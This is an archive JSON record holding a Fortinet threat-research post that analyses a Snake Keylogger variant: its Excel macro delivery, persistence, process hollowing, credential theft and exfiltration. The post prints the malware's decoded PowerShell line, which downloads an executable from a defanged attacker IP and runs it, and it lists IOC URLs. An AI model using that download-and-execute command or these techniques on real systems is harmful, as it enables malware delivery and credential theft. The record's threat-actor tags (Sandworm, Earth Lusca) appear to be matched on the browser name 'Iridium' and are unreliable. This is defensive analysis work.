{
    "id": "7b466ab5-df76-4bfa-9c2b-64176e2a17e0",
    "created_at": "2023-01-12T15:06:27.85153Z",
    "updated_at": "2025-03-27T02:17:05.630319Z",
    "deleted_at": null,
    "sha1_hash": "a4792738530975762b2ee0d751c996a36f6db57e",
    "title": "2021-11-04 - Deep Dive into a Fresh Variant of Snake Keylogger Malware",
    "authors": "",
    "file_creation_date": "2022-05-29T10:46:56Z",
    "file_modification_date": "2022-05-29T10:46:56Z",
    "file_size": 546768,
    "plain_text": "# Deep Dive into a Fresh Variant of Snake Keylogger Malware\n\n**[fortinet.com/blog/threat-research/deep-dive-into-a-fresh-variant-of-snake-keylogger-malware](https://www.fortinet.com/blog/threat-research/deep-dive-into-a-fresh-variant-of-snake-keylogger-malware)**\n\nNovember 4, 2021\n\n[Fortinet’s FortiGuard Labs recently captured a Microsoft Excel sample from the wild that was used to spread malware. After](https://www.fortinet.com/resources/cyberglossary/malware?utm_source=blog&utm_campaign=malware)\n[researching its behaviors, I recognized it as a fresh variant of the Snake Keylogger malware.](https://www.fortinet.com/resources/cyberglossary/what-is-keyloggers.html%20?utm_source=blog&utm_campaign=keylogger)\n\nSnake Keylogger is a malware developed using .NET. It first appeared in late 2020 and focused on stealing sensitive\ninformation from a victim’s device, including saved credentials, the victim’s keystrokes, screenshots of the victim’s screen, and\nclipboard data.\n\nIn July, 2021, Snake Keylogger first entered into a TOP 10 popular malware families report, meaning that the Snake Keylogger\nfamily is increasing its influence and impacting more people’s devices and sensitive data.\n\nIn this threat research blog you will learn how the Snake Keylogger variant is downloaded and executed through a captured\nExcel sample, what techniques this variant uses to protect it from being analyzed, what sensitive information it steals from a\nvictim’s machine, and how it submits that collected data to the attacker.\n\n**Affected platforms:  Microsoft Windows**\n\n**Impacted parties:    Windows Users**\n\n**Impact:            Collects sensitive information from victims’ device**\n\n**Severity level:       Critical**\n\n## What the Captured Microsoft Excel Sample Looks Like\n\n\n-----\n\nThis Excel sample, delivered as an attachment in a phishing email, contains malicious Macro VBA code. Figure 1.1 shows a\nscreenshot of when it is opened. It displays a vague picture of a document and asks the victim to click the yellow button to get a\nclearer image.\n\nFigure 1.1 – The Excel file content when it is opened\n\nOnce the yellow button “Enable Content” is clicked by victim, the malicious VBA code is executed in the background. The\nmalicious macro project that contains the malicious VBA code is password protected so it cannot be viewed by the analyzer.\nHowever, we were able to modify its binary file to remove this restriction.\n\nGoing through its code, a “Workbook_Activate()” method is automatically called when the document is opened. It writes a piece\nof [PowerShell code from a local variable into a BAT file. Figure 1.2 shows partial VBA code of this method, where variable “s”](https://www.fortinet.com/blog/threat-research/offense-and-defense-a-tale-of-two-sides-powershell?utm_source=blog&utm_campaign=offense-and-defense-a-tale-of-two-sides-powershell)\nholds the PowerShell code and \"Gqyztfbtsogpnruooqr.bat\" is the BAT file, which is finally executed by calling code “x =\nShell(bat, 0)”.\n\nFigure 1.2 – Macro VBA code executed in background\n\nThe bottom of Figure 1.2 shows the content of variable “s”, which contains the base64-encoded PowerShell code that is\ndecoded by PowerShell.exe when it is executed.\n\nBelow is the base64-decoded PowerShell code:\n\n$ProcName = \"Wheahmnfpgaqse.exe\";\n(New-Object\nSystem.Net.WebClient).DownloadFile(\"hxxp[:]//3[.]64[.]251[.]139/v3/2/Requests07520000652.exe\",\"$env:APPDATA\\$ProcName\");\n**Start-Process (\"$env:APPDATA\\$ProcName\")**\n\nThe PowerShell code is very simple and easy to understand. It downloads a file (“Requests07520000652.exe”) onto a victim’s\ndevice, places it at “%AppData%\\Wheahmnfpgaqse.exe\" by calling “DownloadFile()”, and executes it by calling “StartProcess()”.\n\n## Snake Keylogger Downloader\n\nAfter some research, I learned that the file \"Wheahmnfpgaqse.exe\" is a downloader of Snake Keylogger, which is a .Net\nprogram. When it starts, it sleeps 21 seconds to bypass those sandboxes with a strategy of killing a sample process when a\ntimeout of no-action is triggered.\n\nFigure 2.1 – Downloads & decrypts Snake Keylogger module after a sleep\n\nTwenty one seconds later, the downloader then invokes a function called “Consturctor()”, as you can see in Figure 2.1. It then\ninvokes another function “Program.List_Types()”, where it downloads Snake Keylogger module from the link\n“hxxps[:]//store2[.]gofile[.]io/download/0283e6ba-afc6-4dcb-b2f4-3173d666e2c4/Huzeigtmvaplpinhoo.dll”, which is a RC4\nencrypted DLL file. Next, it calls “ToRc()” function to RC4 decrypt it using a decryption key \"Dllzjn\".\n\nIt then proceeds to load the decrypted Dll module (a .Net Dll file, called “Huzeigtmvaplpinhoo.dll”), and enumerates its export\nfunctions to find \"G6doICqoMU()\", which is invoked by executing “type.InvokeMember(\\\"G6doICqoMU\\\",\nBindingFlags.InvokeMethod, null, null, null)” in function Consturctor(), as shown in Figure 2.1. The decrypted .Net Dll is a\ndropper and installer of Snake Keylogger.\n\nLet’s dive into this module to see how it performs its tasks.\n\n## Snake Keylogger Installer\n\nAccording to my analysis, the decrypted Dll module (“Huzeigtmvaplpinhoo.dll”) deploys Snake Keylogger onto a victim’s device\nand sets it as an auto-run program. It extracts an executable PE file into memory from the Resource directory and then\nperforms process hollowing that injects the executable PE file into a newly created child process and executes it.\n\nI will explain in detail how it performs these functions in this section.\n\n**1. Persistence Mechanism**\n\nFigure 3.1 – Breaks on the export function “G6doICqoMU()” in the debugger dnSpy\n\n\n-----\n\nFigure 3.1 shows an outline of the decrypted Dll module ( Huzeigtmvaplpinhoo.dll ). As you can see, to prevent its code from\nbeing analyzed the file is obfuscated so that the class names, function names, and variable names are all randomly generated\nmeaningless strings. This creates trouble for analysts when analyzing it.\n\nThe full name of the export function “G6doICqoMU()” is\n“Huzeigtmvaplpinhoo!pXfqpio3clcAoFxTnfJ.CORFgLoyRGlurYwdwIh.G6doICqoMU()”. Again, for the same reason as before, it\nsleeps 35 seconds at the beginning of this function to bypass some malware analysis systems.\n\nNext, it works to make this Snake Keylogger persistent on the infected Windows. As we all know, a Windows system has a\n“Startup” folder inside the “Start Menu”. The programs inside this folder are started when Windows starts. The full path to this\nfolder is defined in the system registry with a string value of\n“HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders\\Startup” and\n“HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders\\Startup”. The value data of\n“Startup” is C:\\Users\\{UserName}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup” by default.\n\nThis variant of Snake Keylogger changes both the values of “Startup” to other folders. Figure 3.2 shows the code changing the\nWindows startup folder to “C:\\Users\\M0YTes0Env\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\chsg\\” by calling\nthe API SetValue(). In the bottom half of Figure 3.2 you can see the content of the system registry path, value name, and new\nvalue data.\n\nFigure 3.2 – Change Windows “Startup” folder to a new path\n\n“chsg” is a new folder created by Snake Keylogger. The program copies the Snake Keylogger file (the\ndownloaded \"Wheahmnfpgaqse.exe\") into this folder and renames it as “sgosr.exe”. This ensures that Snake Keylogger will be\nstarted by the Windows system every time it starts.\n\n**2. Extraction from Resource**\n\nAlthough the content of Huzeigtmvaplpinhoo.dll only appears in memory, to analyze it I saved it into a local file. It has several\nresources in the Resource directory, as shown below in Figure 3.3.\n\nFigure 3.3 – Resource directory display of Huzeigtmvaplpinhoo.dll\n\nThe process of extracting the payload file of Snake Keylogger is a little complicated. It uses a tricky way to load the resource. It\nhas a local callback function defined by ResolveEventHandler that is registered to AppDomain.ResourceResolve, which is then\ncalled when it fails to load a resource by name. It looks like an exception handler to Windows SEH strategy to handle\nexceptions. In addition, it has another local callback function registered to AppDomain.AssemblyResolve, which is called when it\nfails to load an assembly (like a module) by name.\n\nBelow is a pseudocode of registering a local resource resolve, where T9wOjU5ccxTJaVfUntn.Osc50oil0l is the local callback\nfunction.\n\n_AppDomain.ResourceResolve += new ResolveEventHandler(T9wOjU5ccxTJaVfUntn.Osc50oil0l)_\n\nNow, let’s see how Snake Keylogger solves this challenge—loading a nonexistent resource, which will trigger the resource\nloading failure. It plans to read a Resource named \"Qkxkikeg\" from the current module, which has no such named resource in\nthe Resource directory, as you can see in Figure 3.3. A resource loading failure occurs and the registered local\nResolveEventHandler function is called to solve this error. This then causes a loading assembly failure and its assembly resolve\ncallback function is called.\n\nA while later, another PE file, decrypted from resource “{d977ee8c-85ce-4731-b9a1-323ba88c6eeb} ”, appears in memory. It\ncontains a resource with the name “Qkxkikeg”, which is the original request resource name, as shown in Figure 3.4.\n\nFigure 3.4 – “Qkxkikeg” resource is in another module\n\nThe payload of Snake Keylogger is just a compressed in GZIP format in the resource “Qkxkikeg” under the Resource directory\n“ClassLibrary1.Properties.Resources”.\n\nFigure 3.5 displays the GZIP data of the resource “Qkxkikeg” (reversed) on the left and the decompressed Snake Keylogger on\nthe right side.\n\nFigure 3.5 – Compressed and decompressed data of “Qkxkikeg”\n\n\n-----\n\n**3. Process Hollowing**\n\nThe program then creates a suspended child process and deploys the compressed Snake Keylogger payload into the child\nprocess. It then resumes the child process to run. Meanwhile, the parent process exits by calling the function\nEnvironment.Exit(0).\n\nFigure 3.6 – Create a suspended child process\n\nAccording to the code in Figure 3.6, it is about to call API CreateProcess() to create the child process with Creation Flag\n134217732U (0x8000004), which means CREATE_NO_WINDOW and CREATE_SUSPENDED.\n\nIt then calls the API WriteProcessMemory() to copy the Snake Keylogger payload into the child process, section by section. It\nnext calls SetThreadContext() to make the child process point to the entry point function of Snake Keylogger. Before the parent\nprocess exits, an API ResumeThread() is called to have the child process restored to run.\n\n## Snake Keylogger Payload\n\nFigure 4.1 – Fully obfuscated Snake Keylogger payload\n\nThe code of the Snake Keylogger payload file is fully obfuscated, as shown in Figure 4.1, to protect it from being analyzed. The\nclass and function names are unreadable.\n\nTherefore, to better analyze and explain its code and intention, I deobfuscated the payload file using the tool “de4dot”. This\nmade its code more readable, and my analysis is based on that result.\n\nGoing through the Snake Keylogger code, I realized that it provides features like recording a victim’s keystrokes (the keylogger),\nstealing data from the clipboard, obtaining a victim’s screenshot, stealing the data on the system clipboard, as well as stealing\nsaved credentials for some specified software clients installed on a victim’s device.\n\n**1. Keylogger Feature**\n\nFigure 4.2 shows a code snippet of setting up the keylogger.\n\nFigure 4.2 – Initialization of Keylogger\n\nIt calls API SetWindowsHookExA() to register a hook callback function( this.callback_ProcessKey()) to monitor low-level\nkeyboard input events. The first parameter is the hook type, where “13” indicates WH_KEYBOARD_LL.\n\nAfter that, the callback function is called by the Windows system when the victim types, so it is able to handle and record the\nkeystrokes into a global string variable. It also records the foreground Window title to identify where the victim types by calling\nthe [APIs GetForegroundWindow() and GetWindowText ().](https://www.fortinet.com/resources/cyberglossary/api-security?utm_source=blog&utm_campaign=api-security)\n\nIt also has a Timer (Timer0) that keeps sending the keylogger data to the attacker.\n\n**2. Screenshot**\n\nIt is able to take screenshots of the victim’s device. It has a Timer (Timer1), which captures the victim’s screenshots from time to\ntime by calling API CopyFromScreen(). It saves the screenshot into a local Screenshot.png file in the system’s “MyDocuments”\nfolder. It also sends this picture file to the attacker.\n\n**3. System Clipboard**\n\nIt has two Timers. One (Time2) is used to collect system clipboard data by calling Clipboard.GetText() and save to a global\nvariable. The other (Time3) is used to send collected clipboard data to the attacker.\n\nFigure 4.3 – Timer function to obtain system clipboard data\n\nFigure 4.3 shows the Timer function used to obtain system clipboard data. Every time it counts down it checks to see whether\ncurrent clipboard data has been collected in the global variable main_cls.string_clipboard_data. If not, it appends the current\nclipboard data to the global variable.\n\n**4. Steal Credentials**\n\n\n-----\n\nBased on my analysis, this variant s main work is to steal credentials from the victim s device. It implements stealing credentials\nin the Main() function, as shown in Figure 4.4, below.\n\nFigure 4.4 – Main() with functions to steal credentials and submit them\n\nThis is the deobfuscated Main() function showing the functions used to steal credentials from various clients. The function at the\nbottom submits the stolen credentials. These functions obtain the saved credentials for each software from the different places\nthey are save their credentials, including local files (like Chrome) and system registry (like Outlook), etc.\n\nI will now use Outlook as an example to explain how Snake Keylogger collects credentials.\n\nFigure 4.5 is a screenshot of a function that is about to read the credentials of Microsoft Outlook from the system registry. It\ngoes through four registry paths for different Outlook versions to read out (if applicable) “Email” and \"IMAP Password\" or \"POP3\nPassword\" or \"HTTP Password\" or \"SMTP Password\" and “SMTP Server”.\n\nFigure 4.5 – Function to collect saved credentials for Microsoft Outlook\n\nBelow is an example showing what credentials information Snake Keylogger can collect from Microsoft Outlook:\n\n**-------- Snake Keylogger --------**\n\n**Found From: Outlook**\n\n**URL: smtp.gmail.com**\n\n**E-Mail: victim_email@gmail.com**\n\n**PSWD: {Password}**\n\n**---------------------------------**\n\nI have categorized those clients that Snake Keylogger focuses on as below:\n\n**Web Browsers:**\n\nGoogle Chrome, Mozilla Firefox, Mozilla SeaMonkey Browser, Mozilla IceCat Browser, Yandex Browser, Microsoft Edge, Amigo\nBrowser, Nichrome Browser, QQBrowser, Coccoc Browser, Orbitum Browser, Slimjet Browser, Iridium Browser, Vivaldi Browser,\nIron Browser, Ghost Browser, Cent Browser, Xvast Browser, Chedot Browser, SuperBird Browser, 360 Browser, 360 Secure\nBrowser, Comodo Dragon Browser, Brave-Browser, Torch Browser, UC Browser, Blisk Browser, Epic Privacy Browser, Opera\nWeb Browser, Liebao Browser, Avast Browser, Kinza Browser, BlackHawk Browser, Citrio Browser, Uran Browser, Coowon\nBrowser, 7 Star Browser, QIP Surf Browser, Sleipnir Browser, Chrome Canary Browser, CoolNovo Browser, SalamWeb\nBrowser, Sputnik Browser Extension, Falkon Browser, Elements Browser, Slim Browser, Ice Dragon Browser, CyberFox\nBrowser, PaleMoon Browser, Waterfox Browser, Kometa Browser and various browsers designed based on Chromium project.\n\n**Email Clients:**\n\nMicrosoft OutLook, Tencent Foxmail, Mozilla Thunderbird and Postbox.\n\n**Other Clients:**\n\nFileZilla, Pidgin and Discord.\n\n## Sending the Stolen Data to the Attacker\n\nPer the code of this variant of Snake Keylogger, it sends an email to the attacker (using SMTP protocol) to submit the stolen\ncredentials data of the victim.\n\nSnake Keylogger collects basic information regarding the victim’s Windows system, like User name, PC name, System Date\nand Time, Public IP address, and Country, which are put in the header of the collected credentials.\n\nFigure 5.1 – Craft email with stolen credentials\n\n\n-----\n\nFigure 5.1 shows crafting the email with stolen credentials to be sent to the attacker. The bottom is the email s Subject and\nBody. The stolen credentials are put in two attachments, “Passwords.txt” and “User.txt”. Figure 5.2 is a screenshot of\n“Password.txt” attached to the email sent to the attacker with basic information and credentials stolen from my testing Windows\nsystem.\n\nFigure 5.2 – Example of “Password.txt”\n\nTo send stolen data to the attacker, it defines some variables containing the sender’s email address, password, SMTP server\naddress, and SMTP port, as shown in figure 5.3. It defines the variables in the class’s constructor function.\n\nFigure 5.3 – The attacker’s email address is hard-coded in constructor function.\n\nBesides sending data via email, this Snake Keylogger variant also offers FTP and Telegram methods to submit collected\nsensitive data to the attacker.\n\nFor FTP, the attacker needs to set up an FTP server and then tell Snake Keylogger the address of the FTP server and\ncredentials for Snake Keylogger to upload stolen sensitive data.\n\nFor Telegram, Snake Keylogger uses the “sendDocument” method of the “Telegram Bot API” to submit its stolen data to the\nTelegram account that the attacker provides. Refer to Figure 5.4 for more information about the method of Telegram.\n\nFigure 5.4 – Partial code of submitting data using Telegram\n\n## Conclusion on Snake Keylogger Malware\n\nIn order to better understand the entire process of this malware, I drew a flow chart in Figure 6.1 that outlines the main steps\nexplained in this analysis.\n\nFigure 6.1 – The flow chart of the variant of Snake Keylogger\n\nAt the beginning of this analysis, we went through how a malicious Macro inside an Excel document executes PowerShell that\ndownloads the Snake Keylogger's downloader.\n\nNext, I focused more on how the Snake Keylogger installer performs persistence on the victim's device and the complicated,\ntricky way it extracts the payload of Snake Keylogger.\n\nI then elaborated on the features this variant of Snake Keylogger offers, like recording keystrokes, collecting credentials data,\nclipboard data, and screenshots.\n\nAnd finally, I explained how the collected data is submitted to the attacker via email, as well as two other methods: FTP and\nTelegram.\n\n## Fortinet Protections\n\n[Fortinet customers are already protected from this malware by FortiGuard’s Web Filtering, AntiVirus,](https://www.fortinet.com/support-and-training/support-services/fortiguard-security-subscriptions/web-filtering.html?utm_source=blog&utm_campaign=web-filtering) [FortiEDR, and CDR](https://www.fortinet.com/products/endpoint-security/fortiedr.html?utm_source=blog&utm_campaign=fortiedr)\n(content disarm and reconstruction) services, as follows:\n\nThe malicious Macro inside the Excel sample can be disarmed by the FortiGuard CDR (content disarm and reconstruction)\nservice.\n\nAll relevant URLs have been rated as \"Malicious Websites\" by the FortiGuard Web Filtering service.\n\nThe original Excel sample and Snake Keylogger downloader files are detected as \"VBA/SnakeKeylogger.84D0!tr\" and\n\"MSIL/SnakeKeylogger.ADFA!tr\" and are blocked by the FortiGuard AntiVirus service.\n\nFortiEDR detects the downloaded executable file as malicious based on its behavior.\n\nFortiMail protects Fortinet customers by blocking phishing emails.\n\n[We also suggest that readers go through the free NSE training:](https://training.fortinet.com/?utm_source=blog&utm_campaign=nse-institute) [NSE 1 – Information Security Awareness, which has a module](https://training.fortinet.com/local/staticpage/view.php?page=nse_1&utm_source=blog&utm_campaign=nse-1)\non Internet threats designed to help end users learn how to identify and protect themselves from phishing attacks.\n\n## IOCs\n\n\n-----\n\n**URLs:**\n\n\"hxxp[:]//3[.]64[.]251[.]139/v3/2/Requests07520000652.exe\"\n\n\"hxxps[:]//store2[.]gofile[.]io/download/0283e6ba-afc6-4dcb-b2f4-3173d666e2c4/Huzeigtmvaplpinhoo.dll\"\n\n**Sample SHA-256:**\n\n[SOA# 1769.xlsm]\n\n3B437BAA9A07E9DECE2659F20B5D97F8F729BA077D399933041CDC656C8D4D04\n\n[Requests07520000652.exe or Wheahmnfpgaqse.exe]\n\n53D520C1F12FE4E479C6E31626F7D4ABA5A65D107C1A13401380EBCA7CCA5B05\n\n**References:**\n\nhttps://blog.checkpoint.com/2021/08/12/july-2021s-most-wanted-malware-snake-keylogger-enters-top-10-for-first-time/\n\nhttps://docs.microsoft.com/en-us/dotnet/api/system.appdomain.assemblyresolve?view=net-5.0\n\nhttps://docs.microsoft.com/en-us/dotnet/api/system.appdomain.resourceresolve?view=net-5.0\n\n_Learn more about Fortinet’s_ _[FortiGuard Labs threat research and intelligence organization and the FortiGuard Security](https://www.fortinet.com/fortiguard/labs?utm_source=blog&utm_campaign=fortiguard-labs)_\n_[Subscriptions and Services portfolio.](https://www.fortinet.com/fortiguard/labs?tab=security-bundles&utm_source=blog&utm_campaign=security-bundles)_\n\n_Learn more about Fortinet’s_ _[free cybersecurity training, an initiative of Fortinet’s Training Advancement Agenda (TAA), or about](https://www.fortinet.com/training/cybersecurity-professionals?utm_source=blog&utm_medium=campaign&utm_campaign=Freetraininginitiative)_\n_the_ _[Fortinet Network Security Expert program, Security Academy program, and](https://training.fortinet.com/?utm_source=blog&utm_campaign=nse-institute)_ _[Veterans program.](https://www.fortinet.com/corporate/careers/vets.html?utm_source=blog&utm_campaign=fortivet)_\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2021/2021-11-04 - Deep Dive into a Fresh Variant of Snake Keylogger Malware.pdf"
    ],
    "report_names": [
        "2021-11-04 - Deep Dive into a Fresh Variant of Snake Keylogger Malware.pdf"
    ],
    "threat_actors": [
        {
            "id": "75455540-2f6e-467c-9225-8fe670e50c47",
            "created_at": "2022-10-25T16:07:23.740266Z",
            "updated_at": "2025-03-27T02:02:09.955585Z",
            "deleted_at": null,
            "main_name": "Iridium",
            "aliases": [],
            "source_name": "ETDA:Iridium",
            "tools": [
                "CHINACHOPPER",
                "China Chopper",
                "LazyCat",
                "Powerkatz",
                "SinoChopper",
                "reGeorg"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "0661a292-80f3-420b-9951-a50e03c831c0",
            "created_at": "2023-01-06T13:46:38.928796Z",
            "updated_at": "2025-03-27T02:00:02.953963Z",
            "deleted_at": null,
            "main_name": "IRIDIUM",
            "aliases": [],
            "source_name": "MISPGALAXY:IRIDIUM",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "9f101d9c-05ea-48b9-b6f1-168cd6d06d12",
            "created_at": "2023-01-06T13:46:39.396409Z",
            "updated_at": "2025-03-27T02:00:03.074969Z",
            "deleted_at": null,
            "main_name": "Earth Lusca",
            "aliases": [
                "CHROMIUM",
                "ControlX",
                "Red Dev 10",
                "RedHotel",
                "Red Scylla",
                "TAG-22",
                "BRONZE UNIVERSITY",
                "AQUATIC PANDA",
                "Charcoal Typhoon",
                "BountyGlad"
            ],
            "source_name": "MISPGALAXY:Earth Lusca",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "a66438a8-ebf6-4397-9ad5-ed07f93330aa",
            "created_at": "2022-10-25T16:47:55.919702Z",
            "updated_at": "2025-03-27T02:05:17.412024Z",
            "deleted_at": null,
            "main_name": "IRON VIKING",
            "aliases": [
                "ATK14 ",
                "BlackEnergy Group",
                "Blue Echidna ",
                "CTG-7263 ",
                "ELECTRUM ",
                "FROZENBARENTS ",
                "Hades/OlympicDestroyer ",
                "IRIDIUM ",
                "Qudedagh ",
                "Sandworm Team ",
                "Seashell Blizzard ",
                "TEMP.Noble ",
                "Telebots ",
                "Voodoo Bear ",
                "APT44 "
            ],
            "source_name": "Secureworks:IRON VIKING",
            "tools": [
                " BlackEnergy",
                " GCat",
                " GreyEnergy",
                " Industroyer",
                " KillDisk",
                " NotPetya",
                " PSCrypt",
                " TeleBot",
                " TeleDoor",
                " xData",
                "BadRabbit"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "b3e954e8-8bbb-46f3-84de-d6f12dc7e1a6",
            "created_at": "2022-10-25T15:50:23.339976Z",
            "updated_at": "2025-03-27T02:00:55.446795Z",
            "deleted_at": null,
            "main_name": "Sandworm Team",
            "aliases": [
                "Sandworm Team",
                "ELECTRUM",
                "Telebots",
                "IRON VIKING",
                "BlackEnergy (Group)",
                "Quedagh",
                "Voodoo Bear",
                "IRIDIUM",
                "Seashell Blizzard",
                "FROZENBARENTS",
                "APT44"
            ],
            "source_name": "MITRE:Sandworm Team",
            "tools": [
                "Bad Rabbit",
                "Mimikatz",
                "Exaramel for Linux",
                "Exaramel for Windows",
                "GreyEnergy",
                "PsExec",
                "Prestige",
                "P.A.S. Webshell",
                "VPNFilter",
                "Cyclops Blink",
                "SDelete",
                "AcidRain",
                "Industroyer",
                "Industroyer2",
                "BlackEnergy",
                "Cobalt Strike",
                "NotPetya",
                "KillDisk",
                "PoshC2",
                "Impacket",
                "Invoke-PSImage",
                "Olympic Destroyer"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "6abcc917-035c-4e9b-a53f-eaee636749c3",
            "created_at": "2022-10-25T16:07:23.565337Z",
            "updated_at": "2025-03-27T02:02:09.868522Z",
            "deleted_at": null,
            "main_name": "Earth Lusca",
            "aliases": [
                "Bronze University",
                "Charcoal Typhoon",
                "Chromium",
                "Red Dev 10",
                "Red Scylla"
            ],
            "source_name": "ETDA:Earth Lusca",
            "tools": [
                "Agentemis",
                "AntSword",
                "BIOPASS",
                "BIOPASS RAT",
                "BadPotato",
                "Behinder",
                "BleDoor",
                "Cobalt Strike",
                "CobaltStrike",
                "Doraemon",
                "FRP",
                "Fast Reverse Proxy",
                "FunnySwitch",
                "HUC Port Banner Scanner",
                "KTLVdoor",
                "Mimikatz",
                "NBTscan",
                "POISONPLUG.SHADOW",
                "PipeMon",
                "RbDoor",
                "RibDoor",
                "RouterGod",
                "SAMRID",
                "ShadowPad Winnti",
                "SprySOCKS",
                "WinRAR",
                "Winnti",
                "XShellGhost",
                "cobeacon",
                "fscan",
                "lcx",
                "nbtscan"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "8941e146-3e7f-4b4e-9b66-c2da052ee6df",
            "created_at": "2023-01-06T13:46:38.402513Z",
            "updated_at": "2025-03-27T02:00:02.824555Z",
            "deleted_at": null,
            "main_name": "Sandworm",
            "aliases": [
                "G0034",
                "IRIDIUM",
                "Blue Echidna",
                "FROZENBARENTS",
                "Seashell Blizzard",
                "IRON VIKING",
                "ELECTRUM",
                "TeleBots",
                "UAC-0113",
                "UAC-0082",
                "APT44",
                "Quedagh",
                "VOODOO BEAR",
                "TEMP.Noble"
            ],
            "source_name": "MISPGALAXY:Sandworm",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "d53593c3-2819-4af3-bf16-0c39edc64920",
            "created_at": "2022-10-27T08:27:13.212301Z",
            "updated_at": "2025-03-27T02:00:55.529662Z",
            "deleted_at": null,
            "main_name": "Earth Lusca",
            "aliases": [
                "Earth Lusca",
                "TAG-22",
                "Charcoal Typhoon",
                "CHROMIUM",
                "ControlX"
            ],
            "source_name": "MITRE:Earth Lusca",
            "tools": [
                "Mimikatz",
                "PowerSploit",
                "Tasklist",
                "certutil",
                "Cobalt Strike",
                "Winnti for Linux",
                "Nltest",
                "NBTscan",
                "ShadowPad"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "7bd810cb-d674-4763-86eb-2cc182d24ea0",
            "created_at": "2022-10-25T16:07:24.1537Z",
            "updated_at": "2025-03-27T02:02:10.126127Z",
            "deleted_at": null,
            "main_name": "Sandworm Team",
            "aliases": [
                "APT 44",
                "ATK 14",
                "BE2",
                "Blue Echidna",
                "CTG-7263",
                "FROZENBARENTS",
                "IRIDIUM",
                "Iron Viking",
                "Quedagh",
                "Sandworm",
                "Sandworm Team",
                "Seashell Blizzard",
                "TEMP.Noble",
                "UAC-0082",
                "UAC-0113",
                "UAC-0125",
                "UAC-0133",
                "Voodoo Bear"
            ],
            "source_name": "ETDA:Sandworm Team",
            "tools": [
                "AWFULSHRED",
                "ArguePatch",
                "BIASBOAT",
                "Black Energy",
                "BlackEnergy",
                "CaddyWiper",
                "Colibri Loader",
                "Cyclops Blink",
                "CyclopsBlink",
                "DCRat",
                "DarkCrystal RAT",
                "Fobushell",
                "GOSSIPFLOW",
                "Gcat",
                "IcyWell",
                "Industroyer2",
                "JaguarBlade",
                "JuicyPotato",
                "Kapeka",
                "KillDisk.NCX",
                "LOADGRIP",
                "LOLBAS",
                "LOLBins",
                "Living off the Land",
                "ORCSHRED",
                "P.A.S.",
                "PassKillDisk",
                "Pitvotnacci",
                "PsList",
                "QUEUESEED",
                "RansomBoggs",
                "RottenPotato",
                "SOLOSHRED",
                "SwiftSlicer",
                "VPNFilter",
                "Warzone",
                "Warzone RAT",
                "Weevly"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1673535987,
    "ts_updated_at": 1743041825,
    "ts_creation_date": 1653821216,
    "ts_modification_date": 1653821216,
    "files": {
        "pdf": "https://archive.orkl.eu/a4792738530975762b2ee0d751c996a36f6db57e.pdf",
        "text": "https://archive.orkl.eu/a4792738530975762b2ee0d751c996a36f6db57e.txt",
        "img": "https://archive.orkl.eu/a4792738530975762b2ee0d751c996a36f6db57e.jpg"
    }
}